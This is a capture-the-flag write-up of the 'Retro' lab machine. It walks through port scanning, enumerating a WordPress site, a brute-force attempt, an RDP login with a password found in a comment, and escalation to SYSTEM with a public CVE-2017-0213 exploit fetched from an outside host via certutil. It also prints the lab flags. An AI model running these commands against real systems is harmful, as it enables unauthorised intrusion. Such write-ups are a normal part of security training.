# CTF Writeup: Retro

---

## Nmap Scan

```
nmap -sSCV -Pn -n 10.10.207.81 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 03:54 CDT
Nmap scan report for 10.10.207.81
Host is up (0.032s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-09-03T08:54:27+00:00
|_ssl-date: 2025-09-03T08:54:31+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-09-02T08:47:02
|_Not valid after:  2026-03-04T08:47:02
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.37 seconds
```

## Reconaissance

Decided to start Enumeration on The running webserver.

Ran gobuster to enumerate hidden directories. Retrieved a hidden directory called /retro

```
gobuster dir -u http://10.10.207.81/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.207.81/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 149] [--> http://10.10.207.81/retro/]
```
/retro is the official webpage. Scrolling all the way down I found a <login> and it
forwarded me to an wordpress login. Also a user called "Wade" made a lot of posts on the page.

Decided to utilize wpscan, it gave us quite a lot of information, but i decided to just searchup some CVE's. Unfortunately those CVE's were only possible to execute with Credentials.

```
wpscan --url http://10.10.207.81/retro/                                               
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://10.10.207.81/retro/ [10.10.207.81]
[+] Started: Wed Sep  3 04:09:42 2025

Interesting Finding(s):

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.207.81/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://10.10.207.81/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
```
I performed bruteforcing utilizing wpscan

```
wpscan --url http://10.10.207.81/retro/ --usernames=Wade --password=/usr/share/wordlist/rockyou.txt
```

Unfortunately I couldn't retrieve anything, so I decided to go back and enumerate the page further.

Checking out Wade's Comments, there was one interesting finding, he commented: 
"Leaving myself a note here just in case I forget how to spell it: parzival"

## Initial Access

Played around with gaining a shell on wordpress, uploaded initial payload, but got blocked.

So I decided to utilize 3389 RDP.

```
xfreerdp3 /v:10.10.208.248 /u:Wade /p:parzival
```

retrieved user.txt flag on Wade's Desktop

```
3b99fbdc6d430bfb51c72c651a261927
```

## Vulnerability Assessment & Privilege Escalation

opened up cmd.exe and made systeminfo. Machine is running a

- Windows Server 2016
- OS Version: 10.0.14393 N/A Build 14393

googled for windows kernel exploits and utilized:

```
https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip
```

unzipped exploit file locally and launched up python webserver.

```
python3 -m http.server 8000
```
Created C:\Temp directory & started up download request from target machine onto my local machine. 

```
certutil -urlcache -f http://10.21.156.104:8000/CVE-2017-0213_x64.exe exploit.exe
```

ran the exploit.exe and retrieved an cmd.exe as NT AUTHORITY\SYSTEM.

Navigated to C:\Users\Administrator\Desktop and retrieved root.txt.txt file.

```
7958b569565d7bd88d10c6f22d1c4063
```
